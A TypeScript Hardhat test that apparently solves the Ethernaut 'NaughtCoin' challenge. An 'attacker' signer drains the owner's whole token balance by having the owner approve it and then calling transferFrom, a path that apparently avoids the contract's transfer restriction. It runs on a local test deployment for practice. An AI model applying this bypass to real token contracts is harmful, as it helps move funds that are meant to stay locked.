import { SignerWithAddress } from '@nomiclabs/hardhat-ethers/signers';
import { expect } from 'chai';
import { Contract } from 'ethers';
import { ethers } from 'hardhat';

describe('NaughtCoin', () => {
  let owner: SignerWithAddress;
  let attacker: SignerWithAddress;
  let contract: Contract;
  before(async () => {
    [owner, attacker] = await ethers.getSigners();

    const Factory = await ethers.getContractFactory('NaughtCoin');
    contract = await Factory.deploy(owner.address);
    await contract.deployed();
  });

  it('attack', async () => {
    const amount = await contract.balanceOf(owner.address);

    let tx = await contract.approve(attacker.address, amount);
    await tx.wait();

    tx = await contract
      .connect(attacker)
      .transferFrom(owner.address, attacker.address, amount);
    await tx.wait();

    expect(await contract.balanceOf(owner.address)).to.equal(0);
  });
});
